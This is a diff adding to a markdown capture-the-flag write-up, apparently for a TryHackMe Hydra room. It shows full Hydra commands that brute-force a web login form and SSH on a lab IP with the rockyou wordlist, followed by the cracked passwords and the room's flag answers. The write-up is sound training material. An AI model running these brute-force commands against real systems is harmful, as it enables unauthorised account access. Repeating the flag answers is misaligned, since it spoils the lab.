@@ -380,18 +380,122 @@ Now we see `rockyou.txt`.
 
 
 
+After brute force it again:
+````
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.162.145 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect" -V
+````
+<img width="1917" height="902" alt="image" src="https://github.com/user-attachments/assets/247f201a-f15b-4ed9-9b44-029fed317381" />
+
+Now we found the correct passsword:
+````
+sunshine
+````
+
+now we found all the correct password is:
+````
+Username: molly
+Password: sunshine
+````
+
+> **Note:** in this I reopen VPN, so in will deference of `IP`.
+
+Now we can login to target:
+<img width="1849" height="1020" alt="image" src="https://github.com/user-attachments/assets/c518763a-180d-4db8-ac0f-0da0c720428b" />
+
+Now after we got success to login, also we found the correct flag.
+
+
+#### Flag:
+````
+THM{2673a7dd116de68e85c48ec0b1f2612e}
+````
+<img width="1039" height="93" alt="image" src="https://github.com/user-attachments/assets/664f3b07-aba0-44ca-a280-2a3322967ea2" />
+
+Now we got successful to get correct.
+---
+
+
+### 2. Use Hydra to brute-force molly's SSH password. What is the value of flag 2?
+<img width="1047" height="104" alt="image" src="https://github.com/user-attachments/assets/71d3aa7d-deaa-433d-bdea-87a1e3cfee0b" />
+
+Now e can start script to brute force `SSH`:
+````
+hydra -l molly -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.49.162.145 -V
+````
+<img width="1891" height="1010" alt="image" src="https://github.com/user-attachments/assets/0eaa201e-d523-468a-8dfb-035700d06c98" />
+
+| Part                                  | Meaning                                                           |
+| ------------------------------------- | ----------------------------------------------------------------- |
+| `hydra`                               | Starts the Hydra tool                                             |
+| `-l molly`                            | Use **molly** as the username                                     |
+| `-P /usr/share/wordlists/rockyou.txt` | Use the **rockyou.txt** password list                             |
+| `-t 4`                                | Run **4 parallel threads** (4 password attempts at the same time) |
+| `ssh://`                              | Target service is **SSH**                                         |
+| `10.49.162.145`                       | Target machine IP address                                         |
+| `-V`                                  | Verbose mode — show every password attempt                        |
 
 
 
+Now we found the correct Password:
+````
+butterfly
+````
+
+After login to `molly SSH`:
+````
+Username: molly
+Password: butterfly
+````
+
+Command for brute force:
+````
+ssh molly@10.49.162.145
+````
+<img width="1424" height="919" alt="image" src="https://github.com/user-attachments/assets/71f01b8b-b7e4-4813-890b-76f9f63468ef" />
+
+Now we got success to get login to `SSH`.
+
+After check what flag:
+```
+ls
+cat flag2.txt
+```
+<img width="532" height="114" alt="image" src="https://github.com/user-attachments/assets/9a7e1b1a-b3cd-47a2-8ece-100166150f89" />
+
+Or use this command:
+```
+find / -name "*flag*" 2>/dev/null
+```
+<img width="1249" height="999" alt="image" src="https://github.com/user-attachments/assets/be46e0bd-b8a8-4635-ad66-5cc9dc2a158b" />
+
+<img width="1052" height="1037" alt="image" src="https://github.com/user-attachments/assets/c79726f3-b53e-4928-91c6-d78be35922c8" />
+
+This is very userful that to find name in other directory.
+
+````
+cat lag2.txt
+````
+<img width="520" height="86" alt="image" src="https://github.com/user-attachments/assets/1e461488-a788-4262-8970-46bdc45c7e04" />
 
 
+### Flag 2:
+````
+THM{c8eeb0468febbadea859baeb33b2541b}
+````
+<img width="1552" height="148" alt="image" src="https://github.com/user-attachments/assets/6c2b030d-5d6b-4963-a545-7f7941670d1b" />
+
+Now we got successful.
+
+---
 
 
+Now we got successful:
+<img width="1548" height="741" alt="image" src="https://github.com/user-attachments/assets/26b18db5-0de6-458c-8b8e-210ee6db47fa" />
 
 
+---
 
-
-
+<h2 align="center"> K4n0ng </h2>
 
 
 
